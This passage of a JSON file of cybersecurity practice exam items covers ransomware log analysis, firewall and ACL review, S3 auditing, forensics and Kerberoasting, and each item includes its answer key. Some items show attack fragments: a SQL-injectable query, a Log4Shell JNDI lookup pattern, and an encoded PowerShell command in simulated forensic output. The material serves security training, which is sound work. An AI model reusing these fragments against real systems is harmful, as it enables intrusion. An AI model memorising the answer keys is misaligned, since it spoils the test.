      "question": "RDP inbound restricted to IT admin subnet only?",
      "explanation": "Rule 2 is INCORRECT — RDP (TCP 3389) open to 0.0.0.0/0 means internet-accessible RDP. This is one of the most exploited configurations in ransomware attacks. RDP must be restricted to specific management subnets or accessible only via VPN/jump host. All other rules are correctly configured: restricted RDP from IT subnet, permit-all outbound (common workstation policy), block-all-other-inbound (default deny), and allowing DC communication for Group Policy application and authentication.",
      "hint": "Compare the existing rule set with least privilege and the requested business outcome.",
      "currentConfig": "Rule | Direction | Protocol/Port | Remote Address | Action/Correct?\n1. Allow RDP from IT admins | Inbound TCP 3389 | 10.10.0.0/24 | ?\n2. Allow RDP from anywhere | Inbound TCP 3389 | 0.0.0.0/0 (Any) | ?\n3. Allow all outbound | Outbound Any | Any | ?\n4. Block all other inbound | Inbound Any | Any | ?\n5. Allow inbound from domain controllers | Inbound Any | 10.0.1.0/24 (DC subnet) | ?",
      "choices": [
        "CORRECT",
        "INCORRECT"
      ],
      "correct": 0
    },
    {
      "id": "p071",
      "ch": "2",
      "type": "LOG ANALYSIS",
      "emoji": "📊",
      "difficulty": "hard",
      "cat": "IoC",
      "title": "Analyse Windows event logs for ransomware staging",
      "scenario": "",
      "question": "Which log entries form the MOST definitive evidence of a ransomware staging attack in progress?",
      "explanation": "The kill chain evidence: (1) 4,892 file accesses in 8 minutes across Finance, HR, and Legal at 02:14 AM — a backup service account doesn't need to enumerate all files across all sensitive directories simultaneously. This is reconnaissance (mapping valuable targets for encryption). (2) EventID 7045 — new service from C:\\Windows\\Temp\\ named \"WindowsSecurityPatch\" — malicious service installation for persistence/payload execution. Legitimate Windows patches don't install from Temp with generic names. The chain: compromised service account → lateral movement to file server → data reconnaissance → ransomware payload deployment. Respond immediately: isolate the file server and the source workstation.",
      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
      "logData": "Security Event Log — FILE-SERVER-01 — 2024-04-01\n======================================================\n[4624] 02:14:22 DOMAIN\\svc_backup  Logon Type:3 (Network)  Source:WORKSTATION-14\n[4624] 02:14:24 DOMAIN\\svc_backup  Logon Type:3 (Network)  Source:WORKSTATION-14\n[4663] 02:14:35 DOMAIN\\svc_backup  Object:C:\\Finance\\  Access:ReadData ListDirectory\n[4663] 02:14:36 DOMAIN\\svc_backup  Object:C:\\HR\\       Access:ReadData ListDirectory\n[4663] 02:14:38 DOMAIN\\svc_backup  Object:C:\\Legal\\    Access:ReadData ListDirectory\n[5145] 02:14:40 DOMAIN\\svc_backup  Share:\\\\FILE-SERVER-01\\Finance$  Access:GRANTED\n[4663] 02:15:01 DOMAIN\\svc_backup  Object:C:\\Finance\\Q4-Results.xlsx  Access:ReadData\n...4,892 file access events over 8 minutes...\n[7045] 02:23:15  New Service: \"WindowsSecurityPatch\"  Path:C:\\Windows\\Temp\\patch.exe\n[4697] 02:23:15  Service Installed: \"WindowsSecurityPatch\"",
      "choices": [
        "EventID 4624 (network logon) — service account logins are always suspicious",
        "EventID 4663 showing 4,892 file accesses across Finance, HR, and Legal directories in 8 minutes via a service account at 02:14 AM — reconnaissance/staging — followed immediately by EventID 7045 installing a disguised executable from Windows\\Temp — persistence/payload deployment",
        "EventID 5145 showing share access was granted — this is normal for backup service accounts",
        "The 02:14 AM timestamp alone — off-hours logins are always malicious"
      ],
      "correct": 1
    },
    {
      "id": "p072",
      "ch": "2",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "medium",
      "cat": "Vulnerability Types",
      "title": "Select the highest-risk finding from a code review",
      "scenario": "A code review of a financial application finds four issues. Security resources allow fixing only ONE this sprint.",
      "question": "Which finding should be prioritised FIRST?",
      "explanation": "SQL injection on an unauthenticated financial endpoint is the highest priority: (1) Unauthenticated access — any internet user can query any account balance. (2) SQL injection — attacker can extract all account data, authentication credentials, and potentially achieve RCE via xp_cmdshell or file write. (3) Financial data — direct regulatory and liability impact. Logging cleartext PANs violates PCI DSS and should be fixed urgently, but the SQLi creates immediate, complete system compromise risk. Verbose errors aid SQLi attacks but are informational. Internal HTTP is a defence-in-depth gap.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. SQL query built by concatenating user-supplied account ID directly into a query string - Found in: GET /api/account/balance?id=[USER_INPUT]\nCode: \"SELECT balance FROM accounts WHERE id=\" + request.getParameter(\"id\")\nNo parameterisation. No authentication check on the endpoint.\n2. Application logs contain cleartext credit card numbers for debugging - Log line: \"Processing payment for card: 4532-1234-5678-9012\"\nLogs retained for 90 days on shared server. Violates PCI DSS Requirement 3.\n3. Some internal API calls use HTTP instead of HTTPS - Internal microservice-to-microservice calls on the internal network use HTTP. External traffic is HTTPS.\n4. Error messages reveal database table names and column names - On invalid input: \"Column 'account_number' does not exist in table 'customer_accounts'\"\nProvides useful information to attackers for SQL injection refinement.",
      "choices": [
        "SQL query built by concatenating user-supplied account ID directly into a query string",
        "Application logs contain cleartext credit card numbers for debugging",
        "Some internal API calls use HTTP instead of HTTPS",
        "Error messages reveal database table names and column names"
      ],
      "correct": 0
    },
    {
      "id": "p073",
      "ch": "3",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "easy",
      "cat": "Network Architecture",
      "title": "Match network security zones to their trust level and purpose",
      "scenario": "",
      "question": "Match each network zone to its correct trust level and primary purpose.",
      "explanation": "Zone trust hierarchy: Internet: zero trust — all inbound traffic is untrusted. DMZ: semi-trusted — web servers, mail servers live here; can receive internet traffic but cannot initiate connections to internal network. Internal: trusted — corporate workstations, internal servers. Management/OOB: most restricted — only administrators can access; separate physical or logical path to manage network devices without crossing production network. Guest: isolated — internet only, no corporate access; prevents guest devices attacking corporate systems.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "Internet / Untrusted Zone"
        },
        {
          "id": "i1",
          "label": "DMZ / Screened Subnet"
        },
        {
          "id": "i2",
          "label": "Internal Corporate Network"
        },
        {
          "id": "i3",
          "label": "Management / OOB Network"
        },
        {
          "id": "i4",
          "label": "Guest / Partner Network"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Untrusted — all external traffic originates here; no trust, implicit deny inbound"
        },
        {
          "id": "t1",
          "label": "Semi-trusted — hosts public-facing services; isolated from both internet and internal network"
        },
        {
          "id": "t2",
          "label": "Trusted — internal users and corporate assets; protected by perimeter controls"
        },
        {
          "id": "t3",
          "label": "Highly restricted — only security/IT staff; out-of-band access to network device management interfaces"
        },
        {
          "id": "t4",
          "label": "Isolated — internet access only; no access to corporate resources; used by visitors and personal devices"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p074",
      "ch": "3",
      "type": "TERMINAL SIM",
      "emoji": "💻",
      "difficulty": "medium",
      "cat": "Cloud Architecture",
      "title": "Audit S3 bucket permissions with AWS CLI",
      "scenario": "A cloud security engineer audits an S3 bucket \"company-reports-prod\" for public access exposure.",
      "question": "Select the correct AWS CLI command to check the bucket's public access block configuration.",
      "explanation": "get-public-access-block shows the four settings that override all other access grants: BlockPublicAcls (blocks new public ACLs), IgnorePublicAcls (ignores existing public ACLs), BlockPublicPolicy (blocks public bucket policies), RestrictPublicBuckets (restricts access to only AWS service principals and authorised users). All four being FALSE means ACLs or policies could inadvertently expose the bucket publicly. This is a critical finding for a \"prod\" bucket containing company reports. Enable all four at the account level to prevent any S3 bucket from being accidentally made public.",
      "hint": "Select the command that produces the secure result requested by the prompt.",
      "answer": "engineer@workstation:~$ aws configure list\n  access_key: ***\n  region: eu-west-1\nengineer@workstation:~$ # Goal: Check if public access block is enabled\nengineer@workstation:~$ # Bucket: company-reports-prod\n\n{\n  \"PublicAccessBlockConfiguration\": {\n    \"BlockPublicAcls\": false,\n    \"IgnorePublicAcls\": false,\n    \"BlockPublicPolicy\": false,\n    \"RestrictPublicBuckets\": false\n  }\n}\n[CRITICAL] All four Block Public Access settings are DISABLED\n[RISK] Bucket ACLs or bucket policy could grant public access\n[REMEDIATION]\naws s3api put-public-access-block --bucket company-reports-prod \\\n  --public-access-block-configuration \\\n  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true",
      "choices": [
        "aws s3api get-public-access-block --bucket company-reports-prod",
        "aws s3 ls s3://company-reports-prod",
        "aws s3api get-bucket-acl --bucket company-reports-prod",
        "aws s3api delete-bucket --bucket company-reports-prod"
      ],
      "correct": 0
    },
    {
      "id": "p075",
      "ch": "3",
      "type": "ORDERING",
      "emoji": "📋",
      "difficulty": "medium",
      "cat": "Application Security",
      "title": "Order the steps of a secure SDLC (Shift-Left model)",
      "scenario": "",
      "question": "Order these secure development lifecycle activities from EARLIEST to LATEST in the development pipeline.",
      "explanation": "Shift-left security order: (1) Security requirements + threat modelling — design phase, cheapest fix point. (2) SAST in IDE and CI — catches issues during coding before they compile. (3) Security code review — human review before merge. (4) DAST — tests the running application in staging. (5) Penetration test — adversarial testing pre-production. Cost to fix increases at each stage (1x → 100x). The goal of shift-left is to detect and fix security issues as early as possible in the development process, drastically reducing cost and time to remediate.",
      "hint": "Place the steps in the most secure operational order.",
      "items": [
        {
          "id": "o0",
          "label": "Penetration test of production-equivalent staging environment before release"
        },
        {
          "id": "o1",
          "label": "Security requirements definition and threat modelling during system design"
        },
        {
          "id": "o2",
          "label": "SAST (static analysis) integrated into IDE and CI/CD pipeline during coding"
        },
        {
          "id": "o3",
          "label": "DAST (dynamic analysis) against running application in test/staging environment"
        },
        {
          "id": "o4",
          "label": "Security code review by a second developer before merging to main branch"
        }
      ],
      "correctOrder": [
        "o1",
        "o2",
        "o4",
        "o3",
        "o0"
      ]
    },
    {
      "id": "p076",
      "ch": "3",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "hard",
      "cat": "Infrastructure Security",
      "title": "Identify the most critical network architecture flaw",
      "scenario": "A security architect reviews a corporate network diagram. Identify the MOST critical architectural security flaw.",
      "question": "Which architectural decision represents the MOST critical security flaw?",
      "explanation": "Flat /16 network with no segmentation is the root architectural flaw — it enables unrestricted lateral movement. Once any single host is compromised, the attacker has unimpeded access to: financial servers, HR systems, medical devices, backup systems, and management interfaces. All other identified issues (management interface exposure, backup on same segment, DNS) are CONSEQUENCES of the flat network that would be mitigated by proper segmentation. With segmentation: compromised workstation reaches only its VLAN; firewall rules control cross-VLAN traffic; ransomware cannot reach backups; management interfaces are on an isolated OOB VLAN.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. Flat /16 network — all servers, workstations, medical devices on one VLAN - No internal segmentation. Finance, HR, servers, IoT devices, and guest WiFi all share 10.0.0.0/16. Single compromised workstation can reach all systems.\n2. Network device management interfaces accessible from user VLAN - Router, switch, and firewall management consoles reachable from 10.0.0.0/16. No dedicated management network.\n3. Backup server on same network segment as production systems - Ransomware can reach and encrypt backups from any compromised production host.\n4. Internal DNS server resolves both internal and external queries - Split-horizon DNS not implemented. Internal hostnames resolvable from internal network only — as intended.",
      "choices": [
        "Flat /16 network — all servers, workstations, medical devices on one VLAN",
        "Network device management interfaces accessible from user VLAN",
        "Backup server on same network segment as production systems",
        "Internal DNS server resolves both internal and external queries"
      ],
      "correct": 0
    },
    {
      "id": "p077",
      "ch": "3",
      "type": "FILL BLANK",
      "emoji": "✏️",
      "difficulty": "easy",
      "cat": "Cloud Architecture",
      "title": "Complete the cloud service model responsibility descriptions",
      "scenario": "",
      "question": "Fill in who is responsible for each security element in each cloud service model.",
      "explanation": "IaaS (e.g., EC2): customer owns guest OS and above. Provider owns physical, network fabric, hypervisor. SaaS (e.g., Salesforce, Microsoft 365): provider owns everything except customer data and user access configuration. The customer cannot patch the application — they must trust the provider. CASB: Cloud Access Security Broker — four functions: Visibility (shadow IT discovery), Compliance (DLP, data classification), Data Security (encryption, rights management), Threat Protection (anomaly detection, malware scanning). Required for organisations with users accessing many cloud services.",
      "hint": "Fill each blank with the most accurate security term.",
      "blanks": [
        {
          "id": "b0",
          "sentence": "In IaaS, the customer is responsible for ___ — the cloud provider manages physical hardware and the hypervisor.",
          "answer": "guest OS patching and hardening",
          "hint": "physical datacenter security, hypervisor updates, guest OS patching and hardening, network backbone availability"
        },
        {
          "id": "b1",
          "sentence": "In SaaS, the provider is responsible for ___ — the customer is only responsible for their data and user access management.",
          "answer": "application security and OS maintenance",
          "hint": "user data classification, identity federation setup, application security and OS maintenance, network egress filtering"
        },
        {
          "id": "b2",
          "sentence": "A ___ is a cloud security tool that sits between users and cloud service providers to enforce security policies, provide visibility into shadow IT, and apply DLP controls.",
          "answer": "CASB",
          "hint": "WAF, SIEM, CASB, CSPM"
        }
      ]
    },
    {
      "id": "p078",
      "ch": "3",
      "type": "CONFIG/ACL",
      "emoji": "⚙️",
      "difficulty": "medium",
      "cat": "Network Architecture",
      "title": "Complete a network ACL for a multi-tier web application",
      "scenario": "A three-tier web application: Web tier (10.10.1.0/24), App tier (10.10.2.0/24), DB tier (10.10.3.0/24). Internet connects to web tier only.",
      "question": "Allow HTTPS from internet to web tier?",
      "explanation": "Correct three-tier ACL: (1) Internet → Web tier HTTPS: PERMIT — web servers must be internet-accessible. (2) Internet → App tier: DENY — application servers must never be directly internet-accessible. (3) Web → App on 8080: PERMIT — web servers need to call application servers on the specific app port only. (4) App → DB on 3306: PERMIT — app servers need database access on MySQL port only. (5) Web → DB: DENY — web servers must never directly access the database; all DB access goes through the app tier (prevents SQLi on web tier from directly hitting DB). This enforces proper traffic flow and limits blast radius.",
      "hint": "Compare the existing rule set with least privilege and the requested business outcome.",
      "currentConfig": "# | Source | Destination | Port | Action\n1. 0.0.0.0/0 | 10.10.1.0/24 | TCP 443 | ?\n2. 0.0.0.0/0 | 10.10.2.0/24 | Any | ?\n3. 10.10.1.0/24 | 10.10.2.0/24 | TCP 8080 | ?\n4. 10.10.2.0/24 | 10.10.3.0/24 | TCP 3306 | ?\n5. 10.10.1.0/24 | 10.10.3.0/24 | Any | ?",
      "choices": [
        "PERMIT",
        "DENY"
      ],
      "correct": 0
    },
    {
      "id": "p079",
      "ch": "3",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "hard",
      "cat": "Infrastructure Security",
      "title": "Match endpoint security technologies to what they protect against",
      "scenario": "",
      "question": "Match each endpoint security technology to the threat category it MOST effectively addresses.",
      "explanation": "FDE: stolen laptop = encrypted data = no breach. Does NOT protect against network attacks or malware. EDR: behavioural monitoring — detects fileless malware, process injection, lateral movement that signature AV misses. Application whitelisting: gold standard against malware execution — if it's not on the list, it doesn't run. Hardest to implement (admin overhead). Host firewall: limits network exposure of the host itself. Patch management: closes known vulnerability windows — most ransomware exploits known, unpatched vulnerabilities. All five together provide layered endpoint defence.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "Full Disk Encryption (FDE/BitLocker)"
        },
        {
          "id": "i1",
          "label": "Endpoint Detection and Response (EDR)"
        },
        {
          "id": "i2",
          "label": "Application Whitelisting (WDAC/AppLocker)"
        },
        {
          "id": "i3",
          "label": "Host-based Firewall"
        },
        {
          "id": "i4",
          "label": "Patch Management"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Data exposure from physical theft or loss of the device — protects data at rest on stolen hardware"
        },
        {
          "id": "t1",
          "label": "Post-exploitation lateral movement and fileless attacks — detects and responds to behavioural anomalies after initial compromise"
        },
        {
          "id": "t2",
          "label": "Execution of unauthorised or malicious binaries — blocks anything not on the approved application list"
        },
        {
          "id": "t3",
          "label": "Inbound/outbound network connections from the host — limits attack surface and C2 communication"
        },
        {
          "id": "t4",
          "label": "Known CVE exploitation — closes security holes by keeping software up to date"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p080",
      "ch": "3",
      "type": "LOG ANALYSIS",
      "emoji": "📊",
      "difficulty": "medium",
      "cat": "Application Security",
      "title": "Analyse dependency scan results for supply chain risk",
      "scenario": "",
      "question": "Which remediation should be performed FIRST and what additional control should be applied immediately?",
      "explanation": "Log4Shell (CVE-2021-44228) is P0: CVSS 10.0 + CISA KEV + public weaponised exploits + confirmed active exploitation in the wild = highest possible risk. Even though Spring4Shell (CVE-2022-22965) is also KEV, Log4Shell has broader exploitation history and a higher CVSS. Interim WAF virtual patch: block JNDI lookup patterns (${jndi:ldap://...) in all inputs while the update is tested and deployed. This stops active exploitation without a code change. Then update Log4j → Spring Framework → jackson-databind in priority order. Abandoned dependencies are a long-term risk but not an immediate emergency.",
      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
      "logData": "Software Composition Analysis (SCA) Scan Results\n================================================\nProject: payment-api v2.1.0\nScan date: 2024-04-01\n\n[CRITICAL] CVE-2021-44228 — Log4j 2.14.1\n  CVSS: 10.0 | Exploitable: YES | KEV: YES | PoC: Public\n  Used by: logging-framework → payment-api\n  Fixed in: Log4j 2.17.1\n\n[HIGH] CVE-2022-22965 — Spring Framework 5.3.17\n  CVSS: 9.8 | Exploitable: YES | KEV: YES\n  Used by: web-framework → payment-api\n  Fixed in: Spring 5.3.18\n\n[MEDIUM] CVE-2023-XXXX — jackson-databind 2.13.1\n  CVSS: 6.5 | Exploitable: Theoretically | PoC: None\n  Fixed in: jackson-databind 2.13.4\n\n[INFO] 3 dependencies with no recent commits (>2 years)\n  Possible abandoned/unmaintained packages",
      "choices": [
        "Fix the jackson-databind medium finding first as it affects the most code",
        "Update Log4j to 2.17.1 immediately (CVSS 10.0, CISA KEV, public exploit, active exploitation) AND deploy a WAF virtual patch rule blocking JNDI lookup strings as an interim control while testing the update",
        "Address the abandoned dependencies first as they represent long-term supply chain risk",
        "Update Spring Framework first as it has the same KEV status but higher urgency"
      ],
      "correct": 1
    },
    {
      "id": "p081",
      "ch": "3",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "hard",
      "cat": "Cloud Architecture",
      "title": "Identify the critical IaC security misconfiguration",
      "scenario": "A DevSecOps engineer reviews a Terraform configuration for a new web application deployment.",
      "question": "Which Terraform resource configuration represents the MOST critical security misconfiguration?",
      "explanation": "SSH open to 0.0.0.0/0 (internet) is the most critical misconfiguration — it exposes SSH to every IP address on the internet, enabling: (1) Brute-force attacks against SSH credentials. (2) Exploitation of SSH vulnerabilities. (3) If credentials are weak or keys are reused, immediate system compromise. This is consistently one of the top misconfigurations found in cloud environments. Fix: restrict to specific trusted IP ranges (bastion host, VPN gateway, admin office IP) or use AWS Systems Manager Session Manager (no open SSH port needed at all). Missing tags and logging are compliance/observability issues. Missing versioning is a data protection gap.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. Security group: ingress rule allows port 22 (SSH) from 0.0.0.0/0 - resource \"aws_security_group_rule\" { type=\"ingress\" from_port=22 to_port=22 protocol=\"tcp\" cidr_blocks=[\"0.0.0.0/0\"] }\n2. EC2 instances missing required cost allocation tags - resource \"aws_instance\" { ami = \"ami-...\" instance_type = \"t3.medium\" # No tags defined }\n3. S3 bucket access logging not enabled - resource \"aws_s3_bucket\" { bucket = \"app-assets\" # No logging_config block }\n4. S3 bucket versioning not enabled - resource \"aws_s3_bucket\" { bucket = \"app-backups\" # No versioning block }",
      "choices": [
        "Security group: ingress rule allows port 22 (SSH) from 0.0.0.0/0",
        "EC2 instances missing required cost allocation tags",
        "S3 bucket access logging not enabled",
        "S3 bucket versioning not enabled"
      ],
      "correct": 0
    },
    {
      "id": "p082",
      "ch": "3",
      "type": "FILL BLANK",
      "emoji": "✏️",
      "difficulty": "medium",
      "cat": "Network Architecture",
      "title": "Complete the VPN and tunnelling protocol descriptions",
      "scenario": "",
      "question": "Fill in the correct VPN protocol or concept for each description.",
      "explanation": "OpenVPN: mature, widely deployed, TLS-based, very configurable. Port 443 TCP makes it appear as HTTPS — hard to block. WireGuard: modern protocol — ~4,000 lines of code vs ~100,000 for OpenVPN/IPSec. Smaller attack surface, faster handshake, better performance. Now included in Linux kernel. Split-tunnel: corporate traffic through VPN, internet traffic direct — reduces VPN bandwidth requirements and latency for non-corporate traffic. Risk: internet-connected device could be used as a pivot to corporate network if compromised. Full tunnel routes ALL traffic through corporate (more control, higher bandwidth).",
      "hint": "Fill each blank with the most accurate security term.",
      "blanks": [
        {
          "id": "b0",
          "sentence": "___ is an open-source VPN protocol that uses TLS for the control channel and can operate on any port (commonly UDP 1194 or TCP 443), making it very firewall-friendly.",
          "answer": "OpenVPN",
          "hint": "IPSec, OpenVPN, WireGuard, L2TP"
        },
        {
          "id": "b1",
          "sentence": "___ is a modern, high-performance VPN protocol using state-of-the-art cryptography (ChaCha20, Poly1305, Curve25519) with a minimal codebase of approximately 4,000 lines — far simpler and faster than OpenVPN or IPSec.",
          "answer": "WireGuard",
          "hint": "OpenVPN, IKEv2, WireGuard, SSTP"
        },
        {
          "id": "b2",
          "sentence": "In a ___ VPN configuration, only traffic destined for the corporate network is routed through the VPN tunnel — other internet traffic goes directly through the user's local internet connection.",
          "answer": "split-tunnel",
          "hint": "full-tunnel, split-tunnel, hub-and-spoke, site-to-site"
        }
      ]
    },
    {
      "id": "p083",
      "ch": "4",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "easy",
      "cat": "Security Monitoring",
      "title": "Match log source to the security investigation question it answers",
      "scenario": "",
      "question": "Match each log source to the security investigation question it BEST answers.",
      "explanation": "Each log source answers different forensic questions: Windows Security logs: authentication and process execution timeline. DNS logs: C2 beacon detection, DGA (Domain Generation Algorithm) patterns, DNS tunnelling. Proxy logs: user browsing behaviour, web-based malware delivery, data exfiltration via web upload. Cloud audit logs: API-level activity in cloud environments (who created/deleted/modified what resource). EDR telemetry: endpoint behaviour — file modifications, memory operations, process trees, network connections from specific processes. Comprehensive incident response uses ALL of these in correlation.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "Windows Security Event Log (4624, 4688)"
        },
        {
          "id": "i1",
          "label": "DNS query logs"
        },
        {
          "id": "i2",
          "label": "Proxy/web gateway logs"
        },
        {
          "id": "i3",
          "label": "Cloud provider audit logs (CloudTrail/Azure Monitor)"
        },
        {
          "id": "i4",
          "label": "EDR behavioural telemetry"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Who authenticated to what system, and what processes did they launch?"
        },
        {
          "id": "t1",
          "label": "What domains is this host resolving — any DGA patterns or known C2 domains?"
        },
        {
          "id": "t2",
          "label": "What URLs and external resources did this user access from their browser?"
        },
        {
          "id": "t3",
          "label": "What API calls were made in the cloud environment and by which identity?"
        },
        {
          "id": "t4",
          "label": "What processes spawned children, injected memory, or modified files on this endpoint?"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p084",
      "ch": "4",
      "type": "TERMINAL SIM",
      "emoji": "💻",
      "difficulty": "medium",
      "cat": "Incident Response",
      "title": "Collect volatile forensic evidence using PowerShell",
      "scenario": "An IR analyst responds to a live Windows system suspected of compromise. Before network isolation, they must capture volatile data. The output will be saved to D:\\ (forensic USB).",
      "question": "Select the PowerShell command that correctly captures running processes WITH their full command lines and network connections simultaneously.",
      "explanation": "Get-Process -IncludeUserName and selecting CommandLine captures what programs are running and exactly how they were launched — malicious PowerShell is often identified by encoded command-line flags. Get-NetTCPConnection captures active network connections with PIDs — correlate with process list to identify which process is beaconing to C2. Order of volatile capture: processes → network connections → memory (winpmem, RAMMap) → then isolate. Shutting down first destroys everything in RAM including potential encryption keys and attacker tools.",
      "hint": "Select the command that produces the secure result requested by the prompt.",
      "answer": "PS C:\\> # LIVE FORENSICS — capture before isolation\n# Time: 2024-04-01T03:22:07Z\n# Target: WORKSTATION-14\n# Goal: Capture volatile data to D:\\forensics\\\n\nPS C:\\> Get-Process | Select-Object Name,Id,Path,CommandLine | Export-Csv D:\\forensics\\processes.csv -NoTypeInformation\n[CAPTURED] 247 processes — including:\n  svchost.exe (PID 3801) Path: C:\\Users\\Public\\svchost.exe  ← SUSPICIOUS\n  powershell.exe (PID 4900) CommandLine: -enc SQBFAFgA...  ← ENCODED\n\nPS C:\\> Get-NetTCPConnection | Export-Csv D:\\forensics\\connections.csv -NoTypeInformation\n[CAPTURED] 89 TCP connections — including:\n  PID 3801 → 185.220.101.45:443 ESTABLISHED  ← C2\n\n[NEXT] Capture RAM: winpmem.exe D:\\forensics\\memory.raw\n[THEN] Network isolate via EDR console",
      "choices": [
        "Get-Process | Select-Object Name,Id,Path,CommandLine | Export-Csv D:\\forensics\\processes.csv -NoTypeInformation; Get-NetTCPConnection | Export-Csv D:\\forensics\\connections.csv -NoTypeInformation",
        "Get-ChildItem C:\\Windows\\System32 | Export-Csv D:\\system32.csv",
        "Stop-Computer -Force",
        "Compress-Archive -Path C:\\ -DestinationPath D:\\full_backup.zip"
      ],
      "correct": 0
    },
    {
      "id": "p085",
      "ch": "4",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "hard",
      "cat": "Digital Forensics",
      "title": "Match forensic artefact locations to the evidence they contain",
      "scenario": "",
      "question": "Match each Windows forensic artefact location to the evidence it contains.",
      "explanation": "Recent folder: LNK files reveal what files/folders were accessed — useful for insider threat investigations (did they access salary data?). Run key: persistence — malware frequently adds itself here. Prefetch: C:\\Windows\\Prefetch\\MALWARE.EXE-XXXXXXXX.pf proves the executable ran even if the file is deleted — includes run count and timestamps. USBSTOR: every USB drive that ever connected — serial number can be matched to purchase records. Recycle Bin: $I files contain original path and deletion time; $R files contain the actual content (unless emptied).",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "%AppData%\\Microsoft\\Windows\\Recent\\"
        },
        {
          "id": "i1",
          "label": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        },
        {
          "id": "i2",
          "label": "C:\\Windows\\Prefetch\\"
        },
        {
          "id": "i3",
          "label": "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR"
        },
        {
          "id": "i4",
          "label": "$Recycle.Bin\\"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Recently accessed files and folders — shows what the user opened (LNK shortcut files with timestamps)"
        },
        {
          "id": "t1",
          "label": "Programs configured to run at user logon — common malware persistence location"
        },
        {
          "id": "t2",
          "label": "Evidence of program execution — each .pf file proves a specific executable ran, even if later deleted"
        },
        {
          "id": "t3",
          "label": "USB storage devices that have been connected — vendor, product, serial number, and connection history"
        },
        {
          "id": "t4",
          "label": "Deleted files — contains the original file name and deletion timestamp ($I files)"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p086",
      "ch": "4",
      "type": "ORDERING",
      "emoji": "📋",
      "difficulty": "medium",
      "cat": "Vulnerability Management",
      "title": "Order the steps for emergency patch response to a critical CVE",
      "scenario": "",
      "question": "A CISA KEV-listed RCE vulnerability is published for software running on your internet-facing servers. Order the response steps CORRECTLY.",
      "explanation": "Emergency patch response: (1) Identify all affected systems — scope first. (2) Implement compensating controls immediately — WAF virtual patch stops exploitation while you prepare the real fix (critical for KEV-listed CVEs which are being actively exploited). (3) Test the patch — even emergency patches can break things; staging test prevents production outage. (4) Communicate and plan maintenance window — stakeholders need warning. (5) Deploy to production — after validation and communication. The compensating control in step 2 is what makes this process safe — it stops exploitation while steps 3-4 proceed.",
      "hint": "Place the steps in the most secure operational order.",
      "items": [
        {
          "id": "o0",
          "label": "Deploy the patch to production after validation"
        },
        {
          "id": "o1",
          "label": "Identify all systems running the affected software version using asset inventory and CMDB"
        },
        {
          "id": "o2",
          "label": "Test the patch in a development/staging environment for compatibility and regression issues"
        },
        {
          "id": "o3",
          "label": "Implement compensating controls immediately (WAF virtual patch, network restriction, disable feature)"
        },
        {
          "id": "o4",
          "label": "Assess business impact of patching and communicate planned maintenance window to stakeholders"
        }
      ],
      "correctOrder": [
        "o1",
        "o3",
        "o2",
        "o4",
        "o0"
      ]
    },
    {
      "id": "p087",
      "ch": "4",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "medium",
      "cat": "Identity Management",
      "title": "Identify the Kerberoasting vulnerability",
      "scenario": "A threat hunter runs BloodHound analysis on an Active Directory environment and finds the following service account configuration.",
      "question": "Which service account configuration is MOST vulnerable to a Kerberoasting attack?",
      "explanation": "Kerberoasting exploits service accounts with registered SPNs: any domain user can request a Kerberos service ticket (TGS) for any SPN. The TGS is encrypted with the service account's password hash — the attacker takes it offline for cracking. svc_database is the perfect Kerberoasting target: (1) Has an SPN (required). (2) Is a Domain Admin (maximum impact if cracked). (3) 90-day-old 12-character password (feasible to crack offline). Mitigations: use gMSA (240-char uncrackable password) like svc_webpool, or use AES-256 Kerberos encryption, or use managed service accounts with very long random passwords.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. svc_database: SPN registered, Domain Admin member, password: 90 days old - ServicePrincipalName: MSSQLSvc/db-server.corp.com:1433. Member of Domain Admins group. Password complexity: 12 chars. Last changed: 90 days ago. Kerberos TGS tickets can be requested by any domain user.\n2. svc_webpool: Group Managed Service Account (gMSA) - Managed by Active Directory. Password is 240-character random value rotated automatically every 30 days by AD. No SPN attack surface because the password is uncrackable.\n3. svc_monitoring: SPN registered, member of Monitoring_ReadOnly group only - Limited permissions — read-only monitoring access. Password: 16 chars, changed last week.\n4. svc_backup: no SPN, uses certificate-based authentication - No Kerberos SPN registered. Certificate-based auth means no password hash to steal. No Kerberoasting attack surface.",
      "choices": [
        "svc_database: SPN registered, Domain Admin member, password: 90 days old",
        "svc_webpool: Group Managed Service Account (gMSA)",
